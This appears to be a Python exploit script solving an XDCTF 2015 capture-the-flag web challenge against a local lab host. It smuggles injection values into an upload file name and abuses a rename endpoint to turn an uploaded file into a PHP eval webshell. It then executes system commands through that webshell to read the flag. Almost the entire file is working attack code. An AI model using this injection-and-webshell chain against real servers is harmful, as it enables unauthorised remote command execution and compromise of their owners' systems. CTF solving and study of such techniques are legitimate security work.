#!/usr/bin/env python2
# -*- coding:utf-8 -*-
"""
    Author : Virink <virink@outlook.com>
    Date   : 2019/05/28, 15:26
"""


import requests
import re
import string
import random
import sys

URL = 'http://xdctf2015.local.virzz.com/'

req = requests.Session()


def randstr(n=10):
    return ''.join([str(random.choice(string.ascii_lowercase)) for i in range(n)])


def upload(file_name, file_data):
    files = {
        "upfile": (file_name, file_data, 'image/jpeg'),
    }
    res = req.post(url=URL + '/upload.php', files=files)
    if res.status_code == 200 and b'go back' in res.content:
        return True
    else:
        return False


def rename(oldname, newname):
    data = {
        "oldname": oldname,
        "newname": newname
    }
    res = req.post(URL + '/rename.php', data)
    if res.status_code == 200 and b'go back' in res.content:
        return True
    return False


def shell(shellname, passwd, payload="echo md5('v');"):
    data = {}
    data[passwd] = payload
    res = req.post(URL + '/upload/%s.php' % shellname, data)
    if res.status_code == 200:
        if b'9e3669d19b675bd57058fd4664205d2a' in res.content:
            return True
        else:
            return res.content.decode('utf-8')
    return False


if __name__ == '__main__':
    if len(sys.argv) > 2:
        sn = sys.argv[1]
        pwd = sys.argv[2]
        pl = sys.argv[3]
        print(shell(sn, pwd, pl))
        sys.exit()
    shellname = randstr()
    filename = "',extension='',filename='"+shellname+".gif.gif"
    res = upload(filename, "v")
    if res:
        print("[+] Upload Frist Time")
        oldname = "',extension='',filename='"+shellname+".gif"
        newname = shellname+'.gif'
        res = rename(oldname, newname)
        if res:
            print("[+] Rename Frist Time")
            filename = shellname+'.gif'
            filedata = '<?php @eval($_POST["v"]);?>'
            res = upload(filename, filedata)
            if res:
                print("[+] Upload Second Time")
                oldname = shellname+'.gif'
                newname = shellname+'.php'
                res = rename(oldname, newname)
                if res:
                    print("[+] Rename Second Time")
                    res = shell(shellname, "v")
                    if res:
                        print("[+] Good job")
                        print("[+] Webshell url : %supload/%s.php" %
                              (URL, shellname))
                        res = shell(shellname, "v", "system('cat /*flag*');")
                        if res:
                            print("[+] Flag")
                            print("\t%s" % res)
